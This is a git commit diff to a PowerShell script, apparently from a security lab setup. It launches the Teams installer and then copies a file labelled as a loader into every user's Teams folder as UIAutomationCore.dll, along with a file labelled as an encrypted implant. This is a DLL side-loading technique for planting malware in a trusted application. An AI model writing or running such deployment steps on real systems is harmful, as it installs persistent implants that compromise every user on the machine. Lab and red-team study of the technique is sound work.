478864090affe4f606cdaad1b394b09b33b48331
elusivethreat <68078458+elusivethreat@users.noreply.github.com>
2024-01-03 19:47:20 +0000

    Update Launch.ps1

--- Launch.ps1
+++ Launch.ps1
@@ -1,1 +1,7 @@
+# Init Folders
 Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Program Files (x86)\Teams Installer\Teams.exe' }
+Start-Sleep -Seconds 5
+
+# Transfer files into install dir
+Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\LunarUI.bin" $_"\AppData\Local\Microsoft\Teams\UIAutomationCore.dll" } # Loader
+Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\ffmpeg.dat" $_"\AppData\Local\Microsoft\Teams\ffmpeg.dat" }            # Encrypted implant
